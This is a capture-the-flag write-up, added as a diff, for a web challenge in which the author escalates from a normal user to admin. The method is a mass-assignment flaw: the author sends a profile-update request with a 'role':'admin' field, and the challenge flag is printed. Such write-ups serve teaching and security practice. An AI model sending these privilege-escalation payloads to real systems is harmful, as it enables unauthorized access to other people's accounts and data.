@@ -1,0 +1,43 @@
+# Switch It Up (Web / 250 pts)
+
+**Flag:** `TDHT{9b50dac4fee96a5cd4e5b4f2a9c3d66f7a4e}`
+
+---
+
+Opened the challenge URL and got redirected to a login page. Title said "Admin Privilege Escalation" so immediately knew the game — register as a normal user, find a way to become admin.
+
+Registered an account via the API:
+
+```
+POST /api/register
+{"username":"kiro_sv99","password":"Pass999!"}
+```
+
+Logged in and got back my profile:
+
+```json
+{"success":true,"profile":{"username":"kiro_sv99","display_name":"kiro_sv99","role":"user"}}
+```
+
+Noticed `role: "user"` in the response. Checked the page source and found a profile update form that POSTs to `/api/user` with just `display_name`. But there was a commented-out line in the JavaScript that revealed the API returns both `role` and `display_name` after update:
+
+```javascript
+//   setStatus('Profile updated. role=' + result.role + ', display_name=' + result.display_name, 'success');
+```
+
+Classic mass assignment vulnerability. The API blindly accepts whatever JSON fields you throw at it and updates the user object. So I just added `role` to the payload:
+
+```
+POST /api/user
+{"display_name":"kiro_sv99","role":"admin"}
+```
+
+Response confirmed the escalation:
+
+```json
+{"success":true,"display_name":"kiro_sv99","role":"admin"}
+```
+
+Hit `/admin` and the flag was sitting right there on the page. No extra steps, no second factor. Just a missing server-side allowlist on which fields the update endpoint accepts.
+
+Total time: under 2 minutes. The commented-out JS was a dead giveaway.
